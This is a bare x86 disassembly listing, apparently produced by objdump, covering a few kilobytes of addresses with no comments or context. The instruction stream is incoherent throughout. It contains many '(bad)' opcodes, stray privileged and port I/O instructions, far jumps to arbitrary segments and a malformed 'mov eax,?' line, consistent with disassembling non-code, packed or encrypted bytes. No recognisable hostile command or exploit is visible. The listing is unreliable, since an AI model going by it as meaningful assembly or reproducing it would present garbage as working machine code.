  41ceca:	adc    eax,0xe4c9c2d
  41cecf:	mov    DWORD PTR [edi-0x35],0x2432de96
  41ced6:	lods   al,BYTE PTR ds:[esi]
  41ced7:	jge    0x41ce5f
  41ced9:	imul   edx,DWORD PTR [eax+0xaf775da],0x47
  41cee0:	or     BYTE PTR [ebp+edx*4+0x1e],0xd0
  41cee5:	jmp    0x41cf24
  41cee7:	inc    edx
  41cee8:	mov    edx,0x234ea737
  41ceed:	inc    ebx
  41ceee:	aam    0x8c
  41cef0:	data16 and ch,BYTE PTR [esi-0x41]
  41cef4:	inc    ah
  41cef6:	xor    al,ah
  41cef8:	ret    0xb481
  41cefb:	sbb    edx,ecx
  41cefd:	sbb    eax,0xfdb5e8d4
  41cf02:	das    
  41cf03:	mov    eax,ds:0x1ae2198d
  41cf08:	mov    ebp,0xa9055ea3
  41cf0d:	pop    ecx
  41cf0e:	adc    DWORD PTR [ebx+eax*4+0x73],ebp
  41cf12:	inc    ebp
  41cf13:	inc    edx
  41cf14:	cli    
  41cf15:	and    DWORD PTR [eax+ebx*4],eax
  41cf18:	sub    eax,0xd773fb5b
  41cf1d:	shl    BYTE PTR [edi],0xd7
  41cf20:	test   eax,0xada4707b
  41cf25:	mov    edx,0x77dcee28
  41cf2a:	cmp    eax,0x1a5d56b2
  41cf2f:	sbb    esp,eax
  41cf31:	add    eax,0x8ff12507
  41cf36:	out    dx,eax
  41cf37:	mov    bh,0x99
  41cf39:	xchg   ebp,eax
  41cf3a:	or     esp,0x79ae7ccb
  41cf40:	fcmovnbe st,st(3)
  41cf42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf43:	out    0x0,eax
  41cf45:	jmp    0x41cf51
  41cf47:	mov    bh,dh
  41cf49:	(bad)
  41cf4c:	xlat   BYTE PTR ds:[ebx]
  41cf4d:	pop    esi
  41cf4e:	(bad)  
  41cf50:	(bad)  
  41cf51:	xor    BYTE PTR [ebx+0x3a],ah
  41cf54:	gs in  eax,0x5c
  41cf57:	cmp    al,0xd8
  41cf59:	aaa    
  41cf5a:	ret    
  41cf5b:	icebp  
  41cf5c:	jle    0x41cf72
  41cf5e:	inc    ebp
  41cf5f:	dec    edx
  41cf60:	pop    edx
  41cf61:	xchg   BYTE PTR [ebp-0x7b7ad4c9],al
  41cf67:	out    dx,al
  41cf68:	cmp    bl,al
  41cf6a:	sub    esi,ebx
  41cf6c:	inc    ebx
  41cf6d:	push   ds
  41cf6e:	aam    0xa8
  41cf70:	and    cl,dh
  41cf72:	or     al,0xe
  41cf74:	sbb    al,0xcd
  41cf76:	pop    ebp
  41cf77:	aam    0xd
  41cf79:	xlat   BYTE PTR ds:[ebx]
  41cf7a:	js     0x41cf00
  41cf7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf7d:	lock int3 
  41cf7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf80:	push   ds
  41cf81:	xchg   esi,eax
  41cf82:	enter  0xd0dc,0x3a
  41cf86:	xor    al,0x95
  41cf88:	repz jmp 0x41cf2e
  41cf8b:	test   eax,0x325496f3
  41cf90:	xchg   esi,eax
  41cf91:	call   FWORD PTR [ecx+0x2a0f7108]
  41cf97:	inc    esi
  41cf98:	dec    esp
  41cf99:	jnp    0x41cf39
  41cf9b:	xor    al,0x8c
  41cf9d:	sub    dh,ch
  41cf9f:	in     al,0x47
  41cfa1:	in     eax,dx
  41cfa2:	push   0x589dec4a
  41cfa7:	mov    bx,0x412b
  41cfab:	xor    ch,al
  41cfad:	outs   dx,DWORD PTR ds:[esi]
  41cfae:	or     BYTE PTR [ebp-0x46],cl
  41cfb1:	(bad)  
  41cfb2:	nop
  41cfb3:	fdiv   st(2),st
  41cfb5:	sub    al,0x16
  41cfb7:	ins    DWORD PTR es:[edi],dx
  41cfb8:	dec    esi
  41cfb9:	clc    
  41cfba:	in     eax,dx
  41cfbb:	mov    ds:0xe8b8b71b,al
  41cfc0:	xchg   ebp,eax
  41cfc1:	sub    BYTE PTR [ecx],dh
  41cfc3:	sti    
  41cfc4:	push   edi
  41cfc5:	mov    dh,0x58
  41cfc7:	jge    0x41cf8d
  41cfc9:	das    
  41cfca:	jb     0x41d000
  41cfcc:	mov    edx,0x994b003e
  41cfd1:	push   ebp
  41cfd2:	lahf   
  41cfd3:	and    DWORD PTR [ebp-0xb7cf2c8],ebx
  41cfd9:	inc    edi
  41cfda:	mov    esp,0xdc16642f
  41cfdf:	jl     0x41cf6f
  41cfe1:	dec    ecx
  41cfe2:	mov    bl,0xa2
  41cfe4:	sti    
  41cfe5:	outs   dx,BYTE PTR ds:[esi]
  41cfe6:	add    DWORD PTR ds:0x6653f270,esi
  41cfec:	repnz in al,dx
  41cfee:	std    
  41cfef:	in     al,dx
  41cff0:	cmp    BYTE PTR [ebp+ecx*4+0x3b11a485],0x30
  41cff8:	sbb    BYTE PTR [edi],dl
  41cffa:	mov    esp,0x1049e173
  41cfff:	pop    esp
  41d000:	in     eax,dx
  41d001:	int    0x97
  41d003:	mov    DWORD PTR [ebp+0x4e344123],eax
  41d009:	sbb    eax,0x3d03741c
  41d00e:	pop    edx
  41d00f:	sub    al,0x27
  41d011:	sti    
  41d012:	pop    esp
  41d013:	mov    ds:0xf601fc42,al
  41d018:	into   
  41d019:	out    0x72,al
  41d01b:	xor    al,0x49
  41d01d:	mov    al,BYTE PTR [ebx]
  41d01f:	jno    0x41d014
  41d021:	and    al,0x1
  41d023:	pop    ebx
  41d024:	cld    
  41d025:	shl    BYTE PTR [eax+0x12c7b275],1
  41d02b:	(bad)  [ebp+0x2118cdbb]
  41d031:	push   cs
  41d032:	mov    al,0x6e
  41d034:	adc    edx,DWORD PTR [eax]
  41d036:	ret    0x4ca3
  41d039:	ret    0xbc56
  41d03c:	inc    ebp
  41d03d:	mov    edi,0xe174aa40
  41d042:	and    BYTE PTR [edx+0x2365ef34],al
  41d048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d049:	xor    al,0xaa
  41d04b:	(bad)  
  41d04d:	push   ebx
  41d04e:	pop    es
  41d04f:	iret   
  41d050:	sahf   
  41d051:	jne    0x41d0bb
  41d053:	add    BYTE PTR [esi+0x3c],0xa2
  41d057:	add    al,0x6f
  41d059:	popf   
  41d05a:	dec    esi
  41d05b:	fwait
  41d05c:	ret    0x7c8d
  41d05f:	mov    edx,0x889c9193
  41d064:	cmp    al,0x8b
  41d066:	sub    esp,DWORD PTR [esi]
  41d068:	mov    dh,BYTE PTR [esi+0x262ac2b7]
  41d06e:	sahf   
  41d06f:	rol    BYTE PTR [ebx+0x59f619e4],cl
  41d075:	xchg   ecx,eax
  41d076:	mov    ch,0x33
  41d078:	adc    DWORD PTR [ebx],ebp
  41d07a:	jo     0x41d0a4
  41d07c:	addr16 jle 0x41d0e3
  41d07f:	xchg   ecx,eax
  41d080:	popf   
  41d081:	xor    eax,0xb6eba539
  41d086:	jnp    0x41d027
  41d088:	cmp    edi,DWORD PTR [edx+0x62]
  41d08b:	xor    esi,edx
  41d08d:	mov    ebp,cr3
  41d090:	mov    WORD PTR [edi],gs
  41d092:	add    ecx,esi
  41d094:	pop    ebx
  41d095:	add    cl,cl
  41d097:	mov    esp,0x7e50931
  41d09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d09d:	sub    BYTE PTR [esi],dl
  41d09f:	push   0x3ed32d50
  41d0a4:	enter  0x9bf8,0xb0
  41d0a8:	lds    ebp,FWORD PTR [edi-0x4b]
  41d0ab:	jb     0x41d079
  41d0ad:	push   edi
  41d0ae:	pop    ebp
  41d0af:	push   esp
  41d0b0:	xor    eax,0xd32ceb86
  41d0b5:	xor    ecx,esp
  41d0b7:	mov    ah,0x7b
  41d0b9:	idiv   BYTE PTR [edx]
  41d0bb:	fsubr  QWORD PTR [ebx+0x8]
  41d0be:	rcr    DWORD PTR [esi],0xe7
  41d0c1:	dec    ecx
  41d0c2:	fwait
  41d0c3:	add    ebp,DWORD PTR [edi-0x1d050380]
  41d0c9:	fstp   TBYTE PTR [ebx]
  41d0cb:	xor    DWORD PTR [edi],edx
  41d0cd:	xor    eax,0x1b3ac250
  41d0d2:	mov    ch,bl
  41d0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0d5:	pop    edi
  41d0d6:	iret   
  41d0d7:	mov    bl,0x68
  41d0d9:	mov    eax,ds:0x8b9e9054
  41d0de:	in     eax,0x37
  41d0e0:	loop   0x41d15b
  41d0e2:	stc    
  41d0e3:	mov    edi,0xf1a2976a
  41d0e8:	jo     0x41d0c6
  41d0ea:	sub    BYTE PTR [esi-0x5a],ah
  41d0ed:	or     eax,0xac828c6f
  41d0f2:	loop   0x41d158
  41d0f4:	dec    ecx
  41d0f5:	jne    0x41d0bc
  41d0f7:	mov    BYTE PTR [esi+0x326b2d5],ch
  41d0fd:	and    ah,BYTE PTR [eax+ebx*4]
  41d100:	mov    al,ds:0x96f3fd43
  41d105:	and    DWORD PTR [edi-0x43b031a7],ebp
  41d10b:	cwde   
  41d10c:	in     al,dx
  41d10d:	mov    BYTE PTR [ebx],al
  41d10f:	jne    0x41d16b
  41d111:	mov    ecx,0xb85516ae
  41d116:	dec    ebp
  41d117:	jmp    0x41d11c
  41d119:	packuswb mm0,QWORD PTR [ebx-0x7c]
  41d11d:	rol    DWORD PTR [ecx+0x11],0xb4
  41d121:	cli    
  41d122:	adc    al,0x52
  41d124:	nop
  41d125:	aaa    
  41d126:	ins    DWORD PTR es:[edi],dx
  41d127:	add    DWORD PTR [ecx+eax*1-0x4d],eax
  41d12b:	sub    edi,DWORD PTR [ebx+0x485079ae]
  41d131:	popa   
  41d132:	push   eax
  41d133:	mov    esp,0x7f6fa355
  41d138:	cmc    
  41d139:	xchg   esp,eax
  41d13a:	jo     0x41d0f1
  41d13c:	pop    ebp
  41d13d:	ret    
  41d13e:	daa    
  41d13f:	mov    cs,esi
  41d141:	fldcw  WORD PTR [ebx+edx*8+0x21]
  41d145:	call   0x1a0c:0x207758a5
  41d14c:	daa    
  41d14d:	cs pop ebp
  41d14f:	mov    eax,0x52f46c8b
  41d154:	and    DWORD PTR [ebx],ecx
  41d156:	xor    ah,cl
  41d158:	lods   eax,DWORD PTR ds:[esi]
  41d159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d15a:	test   eax,esp
  41d15c:	mov    esi,cs
  41d15e:	stos   DWORD PTR es:[edi],eax
  41d15f:	mov    ebp,0x8465ec43
  41d164:	jmp    0x161:0xc2bf84f7
  41d16b:	jg     0x41d173
  41d16d:	add    eax,0xa5b28dd7
  41d172:	enter  0xe858,0x9f
  41d176:	sbb    bl,bh
  41d178:	enter  0x37a2,0x2e
  41d17c:	mov    ebp,0xaf80151b
  41d181:	jp     0x41d1ff
  41d183:	pop    ebx
  41d184:	les    eax,FWORD PTR [edx+ebp*8-0x5f0f5243]
  41d18b:	loop   0x41d151
  41d18d:	loope  0x41d151
  41d18f:	test   cl,cl
  41d191:	fiadd  DWORD PTR [edi-0x29]
  41d194:	push   edi
  41d195:	cdq    
  41d196:	loopne 0x41d156
  41d198:	inc    esi
  41d199:	mov    eax,0x7af23166
  41d19e:	les    ebx,FWORD PTR [edi+0x7ba51c7d]
  41d1a4:	adc    eax,0x379546da
  41d1a9:	mov    esp,0x1946b027
  41d1ae:	add    ah,BYTE PTR [edi-0x4b]
  41d1b1:	or     BYTE PTR [ecx],ah
  41d1b3:	inc    edx
  41d1b4:	xor    edx,DWORD PTR [ecx+0x19]
  41d1b7:	retf   0xb79c
  41d1ba:	cmp    DWORD PTR [edi+0x29],eax
  41d1bd:	ficomp DWORD PTR [esi+ebp*4+0x1c]
  41d1c1:	(bad)  
  41d1c2:	xchg   ebp,eax
  41d1c3:	(bad)
  41d1c7:	sub    BYTE PTR [ebp-0x75],cl
  41d1ca:	(bad)  [ebx]
  41d1cc:	mov    ebp,0x18799311
  41d1d1:	mov    al,0x69
  41d1d3:	leave  
  41d1d4:	xchg   ebp,eax
  41d1d5:	in     al,dx
  41d1d6:	xor    DWORD PTR [edi-0x577226c1],edi
  41d1dc:	lods   eax,DWORD PTR ds:[esi]
  41d1dd:	push   esp
  41d1de:	cmp    ah,BYTE PTR ds:0x7a4c44df
  41d1e4:	ficomp DWORD PTR es:[ebx+0x43618c54]
  41d1eb:	cmp    DWORD PTR [ebp-0x61],ebp
  41d1ee:	push   eax
  41d1ef:	in     al,dx
  41d1f0:	inc    ebp
  41d1f1:	sub    eax,0xfdae7f56
  41d1f6:	dec    esi
  41d1f7:	icebp  
  41d1f8:	add    al,0x25
  41d1fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1fb:	mov    bl,0x69
  41d1fd:	call   FWORD PTR [di]
  41d200:	in     eax,0x9a
  41d202:	adc    al,0x35
  41d204:	push   cs
  41d205:	jecxz  0x41d1f0
  41d207:	movups xmm3,xmm0
  41d20a:	cwde   
  41d20b:	cmp    DWORD PTR [ebx+0x43430253],ebp
  41d211:	lock push ss
  41d213:	lock and ebp,DWORD PTR ss:[si+0x3deb]
  41d21a:	or     DWORD PTR [ebx+0x10778efb],eax
  41d220:	pop    ebx
  41d221:	pop    edi
  41d222:	les    ebp,FWORD PTR [edx+ebp*8+0x1bdd6c44]
  41d229:	jno    0x41d21b
  41d22b:	mov    ebp,0xf1ae9896
  41d230:	ds push edi
  41d232:	cmc    
  41d233:	jecxz  0x41d27f
  41d235:	(bad)  
  41d236:	fdiv   st(6),st
  41d238:	aaa    
  41d239:	out    dx,eax
  41d23a:	add    al,0x1c
  41d23c:	aaa    
  41d23d:	rol    BYTE PTR [esi],1
  41d23f:	and    DWORD PTR [ebx+0x531a20bd],ecx
  41d245:	lods   al,BYTE PTR ds:[esi]
  41d246:	and    esi,DWORD PTR [eax+0x79fa8bee]
  41d24c:	jle    0x41d1f8
  41d24e:	jle    0x41d2a8
  41d250:	jecxz  0x41d222
  41d252:	cmp    esi,esp
  41d254:	mov    al,ds:0x22c598b9
  41d259:	pop    ebx
  41d25a:	and    edi,edi
  41d25c:	mov    cl,0x8f
  41d25e:	push   ecx
  41d25f:	inc    esi
  41d260:	loop   0x41d1e8
  41d262:	out    dx,al
  41d263:	sub    eax,0xef62f663
  41d268:	test   al,0xc6
  41d26a:	and    BYTE PTR [ecx-0x11],bh
  41d26d:	add    BYTE PTR [edx-0x1d16915a],bh
  41d273:	pop    di
  41d275:	imul   edi,DWORD PTR [ebp-0x32],0x5d0d354e
  41d27c:	push   0x1b
  41d27e:	je     0x41d213
  41d280:	test   eax,0xc1af644f
  41d285:	lahf   
  41d286:	call   0xc7a:0xd7d5ebab
  41d28d:	(bad)  
  41d28f:	xchg   esp,eax
  41d290:	jns    0x41d2de
  41d292:	lea    ebp,[ebx+edi*8]
  41d295:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d297:	adc    edi,DWORD PTR [esi]
  41d299:	adc    bh,BYTE PTR [esi+0x33]
  41d29c:	test   DWORD PTR [edi-0xe],0x3c277e4b
  41d2a3:	popa   
  41d2a4:	into   
  41d2a5:	mov    eax,ds:0xa75b6564
  41d2aa:	popf   
  41d2ab:	aam    0x7b
  41d2ad:	fild   DWORD PTR [eax-0x5c]
  41d2b0:	imul   eax,DWORD PTR [esi],0x5c
  41d2b3:	mov    ecx,0x7b7b4e71
  41d2b8:	cdq    
  41d2b9:	dec    edx
  41d2ba:	bound  esp,QWORD PTR [edi-0xafb09d2]
  41d2c0:	inc    edi
  41d2c1:	push   edx
  41d2c2:	in     al,0x5a
  41d2c4:	or     edi,DWORD PTR [ecx+0x2a]
  41d2c7:	stos   DWORD PTR es:[edi],eax
  41d2c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2c9:	cmp    BYTE PTR [eax-0x56b82cb3],dl
  41d2cf:	out    0x29,eax
  41d2d1:	dec    esp
  41d2d2:	dec    ecx
  41d2d3:	mov    dh,0xd4
  41d2d5:	pop    edx
  41d2d6:	les    eax,FWORD PTR [edx-0x40]
  41d2d9:	enter  0x1911,0xe1
  41d2dd:	jnp    0x41d357
  41d2df:	dec    edx
  41d2e0:	scas   al,BYTE PTR es:[edi]
  41d2e1:	jbe    0x41d2d9
  41d2e3:	jge    0x41d2d7
  41d2e5:	mov    bl,0x50
  41d2e7:	sbb    BYTE PTR [eax-0x2f],bl
  41d2ea:	jns    0x41d342
  41d2ec:	push   ecx
  41d2ed:	call   0x8ddd2dbe
  41d2f2:	ret    0x2b31
  41d2f5:	push   esi
  41d2f6:	push   es
  41d2f7:	into   
  41d2f8:	jne    0x41d2ef
  41d2fa:	dec    eax
  41d2fb:	inc    edi
  41d2fc:	adc    al,0x38
  41d2fe:	xor    esi,ebp
  41d300:	or     bh,BYTE PTR [esi+0x0]
  41d303:	adc    DWORD PTR [edi+0x294c6fb7],edx
  41d309:	stc    
  41d30a:	push   edi
  41d30b:	mov    eax,?
  41d30d:	shl    DWORD PTR [edx],cl
  41d30f:	xchg   BYTE PTR [eax-0x2f88876a],bl
  41d315:	add    DWORD PTR [esi],0xfc3f607f
  41d31b:	mov    ch,0x2f
  41d31d:	add    BYTE PTR [edi+0x7],bl
  41d320:	(bad)  
  41d322:	xchg   dh,dh
  41d324:	(bad)  
  41d325:	mov    edx,0x69c71be5
  41d32a:	xchg   ebp,eax
  41d32b:	iret   
  41d32c:	stos   DWORD PTR es:[edi],eax
  41d32d:	scas   eax,DWORD PTR es:[edi]
  41d32e:	mov    cl,BYTE PTR [ebx]
  41d330:	stos   DWORD PTR es:[edi],eax
  41d331:	pop    esi
  41d332:	cmc    
  41d333:	cwde   
  41d334:	pop    esi
  41d335:	(bad)  
  41d336:	fstp   DWORD PTR [edx]
  41d338:	pop    ecx
  41d339:	(bad)  
  41d33a:	sbb    BYTE PTR [esi+ebp*1-0x65],dl
  41d33e:	lea    eax,[ebx-0x409e78ac]
  41d344:	cmp    edx,0xffffff9e
  41d347:	mov    esp,0xe330525f
  41d34c:	ficomp WORD PTR [eax]
  41d34e:	adc    ah,BYTE PTR [eax+0x15823bd1]
  41d354:	cmp    al,0x7c
  41d356:	call   0xf9cf:0x96b23151
  41d35d:	lahf   
  41d35e:	mov    esp,0x7a243000
  41d363:	pop    ebp
  41d364:	mov    ebx,0x1ccdf63c
  41d369:	ret    
  41d36a:	test   eax,0xfc4028bb
  41d36f:	cmp    bh,BYTE PTR [edi]
  41d371:	es sbb eax,0x4c1bd697
  41d377:	call   FWORD PTR ds:0xb3586a17
  41d37d:	xor    al,0xba
  41d37f:	fist   WORD PTR [edi]
  41d381:	fcomp  QWORD PTR [edx+0x26]
  41d384:	into   
  41d385:	repnz push eax
  41d387:	ret    
  41d388:	push   eax
  41d389:	aad    0x7d
  41d38b:	dec    esp
  41d38c:	rol    BYTE PTR [eax+0x57],cl
  41d38f:	dec    edx
  41d390:	pop    ebx
  41d391:	sub    eax,0xdc9be405
  41d396:	sub    BYTE PTR cs:[edi+0x6c],dl
  41d39a:	dec    esp
  41d39b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d39c:	or     eax,0xbb00ca40
  41d3a1:	or     bh,BYTE PTR [eax]
  41d3a3:	xlat   BYTE PTR ds:[ebx]
  41d3a4:	or     eax,0x3e6ba676
  41d3a9:	sub    esi,DWORD PTR [edx]
  41d3ab:	dec    eax
  41d3ac:	fimul  DWORD PTR [ecx]
  41d3ae:	xchg   edi,eax
  41d3af:	mov    eax,ds:0x98f29ebb
  41d3b4:	push   ds
  41d3b5:	fnstsw WORD PTR [edx]
  41d3b7:	and    DWORD PTR [edi],0xffffffbb
  41d3ba:	in     eax,dx
  41d3bb:	dec    ebx
  41d3bc:	lods   al,BYTE PTR ds:[esi]
  41d3bd:	adc    BYTE PTR [eax-0x20],dh
  41d3c0:	pop    esi
  41d3c1:	ds push ecx
  41d3c3:	push   0xffffffdd
  41d3c5:	cwde   
  41d3c6:	mov    esp,0x11fe65af
  41d3cb:	adc    BYTE PTR [ebx],al
  41d3cd:	stc    
  41d3ce:	adc    al,0xc5
  41d3d0:	jl     0x41d373
  41d3d2:	mov    ds:0x884d38d5,al
  41d3d7:	xor    eax,0x384bd2b
  41d3dc:	shl    DWORD PTR [ebx-0x2befca04],cl
  41d3e2:	mov    eax,ds:0x3c9486cc
  41d3e7:	mov    dl,0x87
  41d3e9:	repz sbb DWORD PTR [ebx+eiz*4-0x69],ebp
  41d3ee:	mov    gs,WORD PTR [ecx]
  41d3f0:	pop    edx
  41d3f1:	fs xchg esp,eax
  41d3f3:	cmp    eax,0x9887367f
  41d3f8:	pop    eax
  41d3f9:	push   edi
  41d3fa:	push   ds
  41d3fb:	xchg   edx,eax
  41d3fc:	ret    0x58ba
  41d3ff:	fisttp WORD PTR [esi+0x62]
  41d402:	mov    ah,0x1
  41d404:	dec    ecx
  41d405:	ds ins DWORD PTR es:[edi],dx
  41d407:	pop    esi
  41d409:	call   0x91a753c3
  41d40e:	jecxz  0x41d482
  41d410:	ins    BYTE PTR es:[edi],dx
  41d411:	add    DWORD PTR [esi-0x67cf32a],ebx
  41d417:	scas   al,BYTE PTR es:[edi]
  41d418:	and    DWORD PTR [eax-0x2c5931b7],0xcd1477c2
  41d422:	cmp    WORD PTR [edx+0xc],bp
  41d426:	push   eax
  41d427:	adc    BYTE PTR [ebp+0x706713a6],dl
  41d42d:	jmp    0x41d40b
  41d42f:	mov    esi,0x43f75ae1
  41d434:	not    ah
  41d436:	xlat   BYTE PTR ds:[ebx]
  41d437:	sbb    ebp,DWORD PTR [esi-0x465ee5c0]
  41d43d:	loopne 0x41d3c4
  41d43f:	aam    0x74
  41d441:	(bad)  
  41d442:	fdivr  DWORD PTR [esi]
  41d444:	les    eax,FWORD PTR [ebp+0x4f]
  41d447:	dec    esi
  41d448:	retf   
  41d449:	push   esp
  41d44a:	mov    ds:0x6f0ec83e,eax
  41d44f:	shl    BYTE PTR [edx+0xb],0x9d
  41d453:	dec    edx
  41d454:	repnz xchg esp,eax
  41d456:	out    0x39,eax
  41d458:	jmp    0x8e5e:0xb76b5f45
  41d45f:	push   ds
  41d460:	fistp  WORD PTR [eax]
  41d462:	sahf   
  41d463:	or     BYTE PTR [eax],bh
  41d465:	pop    esi
  41d466:	mov    dh,0xc9
  41d468:	mov    edx,0xfc3762e4
  41d46d:	(bad)  
  41d46e:	push   es
  41d46f:	lock sub ah,BYTE PTR [eax+0x49]
  41d473:	cwde   
  41d474:	fnsave [eax]
  41d476:	add    edx,esp
  41d478:	and    eax,0x8ce38b77
  41d47d:	xor    DWORD PTR [edx+0x7591170b],ebx
  41d483:	cld    
  41d484:	ds push es
  41d486:	adc    edi,DWORD PTR [ecx-0x588a4848]
  41d48c:	clc    
  41d48d:	nop
  41d48e:	adc    edi,DWORD PTR [eax+0x2839e0e6]
  41d494:	scas   al,BYTE PTR es:[edi]
  41d495:	or     ch,cl
  41d497:	sbb    BYTE PTR [ebx+0x1ce4102f],ch
  41d49d:	int    0x45
  41d49f:	imul   eax,esp,0x71
  41d4a2:	(bad)  
  41d4a3:	fsubr  QWORD PTR ds:0x243f668a
  41d4a9:	mov    ebp,0x6f8a4e51
  41d4ae:	(bad)  
  41d4af:	out    0x7,al
  41d4b1:	out    dx,al
  41d4b2:	or     eax,0xc0fd9449
  41d4b7:	dec    esp
  41d4b8:	clc    
  41d4b9:	outs   dx,DWORD PTR ds:[esi]
  41d4ba:	rcl    BYTE PTR [eax-0x2e],cl
  41d4bd:	stos   DWORD PTR es:[edi],eax
  41d4be:	adc    BYTE PTR [edx+edi*2],ah
  41d4c1:	hlt    
  41d4c2:	mov    dl,0x5c
  41d4c4:	cmp    al,BYTE PTR [ecx+0x6631c2a1]
  41d4ca:	inc    esi
  41d4cb:	frstor [eax+0x74301f5e]
  41d4d1:	xor    ecx,DWORD PTR [edx]
  41d4d3:	out    0xc7,eax
  41d4d5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41d4d7:	push   esi
  41d4d8:	enter  0x510f,0x86
  41d4dc:	adc    BYTE PTR [ecx],cl
  41d4de:	or     BYTE PTR [ecx+0x1da0c2cb],dh
  41d4e4:	not    BYTE PTR [edx-0x72]
  41d4e7:	xchg   edx,eax
  41d4e8:	mov    ch,0xb
  41d4ea:	cdq    
  41d4eb:	icebp  
  41d4ec:	push   esi
  41d4ed:	cld    
  41d4ee:	ret    
  41d4ef:	repz jmp 0x41d475
  41d4f2:	(bad)  
  41d4f3:	idiv   bl
  41d4f5:	add    BYTE PTR [ebx-0x51eb7897],ah
  41d4fb:	cmp    al,0x5b
  41d4fd:	sbb    eax,eax
  41d4ff:	mov    edx,0xea9c061a
  41d504:	adc    al,0x93
  41d506:	retf   
  41d507:	jmp    0x51c18f80
  41d50c:	pop    edx
  41d50d:	sub    ch,BYTE PTR [esp+ebx*1+0x5bff1ddf]
  41d514:	inc    esi
  41d515:	aaa    
  41d516:	or     BYTE PTR [ebp-0x45],al
  41d519:	mov    al,ds:0x16d6ba6
  41d51e:	inc    esp
  41d51f:	push   ebx
  41d520:	mov    al,ds:0xcfa10df0
  41d525:	shl    esp,1
  41d527:	mov    bh,0x7e
  41d529:	xor    edi,esp
  41d52b:	cli    
  41d52c:	push   edi
  41d52d:	cwde   
  41d52e:	mov    eax,0x24254744
  41d533:	sbb    BYTE PTR [edx*4-0x5c9b0187],ch
  41d53a:	sub    bh,BYTE PTR [ecx-0x31]
  41d53d:	dec    ebx
  41d53e:	add    eax,0x9b665246
  41d543:	and    al,0xd
  41d545:	popw   es
  41d547:	nop
  41d548:	jbe    0x41d52d
  41d54a:	clc    
  41d54b:	lds    eax,FWORD PTR [eax+0x53]
  41d54e:	mov    bl,0x8a
  41d550:	dec    esi
  41d551:	jg     0x41d595
  41d553:	mov    ecx,0xed2ddb33
  41d558:	add    bl,ah
  41d55a:	mov    bh,BYTE PTR [esi-0x2b]
  41d55d:	or     DWORD PTR [edx+esi*4-0x55],0xffffffc3
  41d562:	or     DWORD PTR [eax-0x3c],edx
  41d565:	fstp   QWORD PTR [ebx-0x69]
  41d568:	lock xchg esi,eax
  41d56a:	inc    esp
  41d56b:	mov    ch,0x9b
  41d56d:	pop    ecx
  41d56e:	iret   
  41d56f:	in     eax,dx
  41d570:	adc    BYTE PTR [edx+0x1a702b5b],dh
  41d576:	push   esp
  41d577:	fdivr  QWORD PTR [edx+0x790a8f57]
  41d57d:	add    al,0x20
  41d57f:	sar    BYTE PTR [edx],cl
  41d581:	ja     0x41d58d
  41d583:	jae    0x41d53f
  41d585:	ficomp DWORD PTR [ecx+ecx*2-0x5198e4e5]
  41d58c:	out    0x63,al
  41d58e:	loop   0x41d572
  41d590:	test   edx,0x8a28cd2f
  41d596:	pushf  
  41d597:	hlt    
  41d598:	and    BYTE PTR [edi-0x7c],0x46
  41d59c:	or     ebp,DWORD PTR [ebx]
  41d59e:	mov    al,ds:0x17a62a72
  41d5a3:	aas    
  41d5a4:	sub    edi,DWORD PTR [edi-0xb]
  41d5a7:	clc    
  41d5a8:	adc    edi,DWORD PTR [edi-0x1fe7bc8a]
  41d5ae:	shr    DWORD PTR [ebp+0x2e],1
  41d5b1:	out    0x5f,eax
  41d5b3:	cli    
  41d5b4:	scas   al,BYTE PTR es:[edi]
  41d5b5:	mov    bl,0x32
  41d5b7:	mov    ecx,DWORD PTR [esi+0x1c]
  41d5ba:	(bad)
  41d5bd:	cmp    DWORD PTR [ebx],0xfffffff9
  41d5c0:	sub    al,0xa4
  41d5c2:	dec    ebx
  41d5c3:	xchg   esp,eax
  41d5c4:	gs cmp al,0x1e
  41d5c7:	ja     0x41d5ca
  41d5c9:	push   ebp
  41d5ca:	mov    ch,0x9c
  41d5cc:	and    BYTE PTR [ebx],al
  41d5ce:	sbb    esi,DWORD PTR [edx+esi*4+0xf]
  41d5d2:	cmp    edi,DWORD PTR ds:0x9109b8db
  41d5d8:	cmp    ebx,DWORD PTR [edx+0x6056e053]
  41d5de:	xchg   esp,ebp
  41d5e0:	jns    0x41d649
  41d5e2:	jecxz  0x41d660
  41d5e4:	sub    edx,DWORD PTR [ecx-0x6be3583f]
  41d5ea:	in     al,dx
  41d5eb:	enter  0xbf8e,0x76
  41d5ef:	icebp  
  41d5f0:	add    al,0x1
  41d5f2:	imul   BYTE PTR [edi+0x1f]
  41d5f5:	fistp  WORD PTR [eax+esi*4-0x34]
  41d5f9:	std    
  41d5fa:	xchg   dl,ch
  41d5fc:	sub    eax,0x29c4ce35
  41d601:	push   0x1f
  41d603:	xor    al,0xf3
  41d605:	gs dec ebx
  41d607:	dec    esp
  41d608:	adc    al,BYTE PTR [eax+0x2fae35b5]
  41d60e:	xchg   esp,ecx
  41d610:	retf   
  41d611:	jns    0x41d611
  41d613:	pop    ebp
  41d614:	xor    DWORD PTR [edx],0x39
  41d617:	lods   eax,DWORD PTR ds:[esi]
  41d618:	retf   0xdcec
  41d61b:	call   0xcbb9:0x773fe23d
  41d622:	mov    bh,0x1e
  41d624:	and    ebp,esp
  41d626:	sub    DWORD PTR [ebx+eax*8+0x35],0x4960fdd1
  41d62e:	enter  0x58e0,0x38
  41d632:	popf   
  41d633:	sti    
  41d634:	push   es
  41d635:	cmp    dl,BYTE PTR [ecx-0x22]
  41d638:	cmp    BYTE PTR [ebp-0x41568844],al
  41d63e:	adc    edx,DWORD PTR [ecx]
  41d640:	inc    edi
  41d641:	sub    al,0x40
  41d643:	pop    ecx
  41d644:	test   dh,ah
  41d646:	push   esi
  41d647:	fwait
  41d648:	pop    ecx
  41d649:	std    
  41d64a:	repz imul esp,edx,0x7a
  41d64e:	ja     0x41d644
  41d650:	test   al,0x6d
  41d652:	popf   
  41d653:	in     eax,0x31
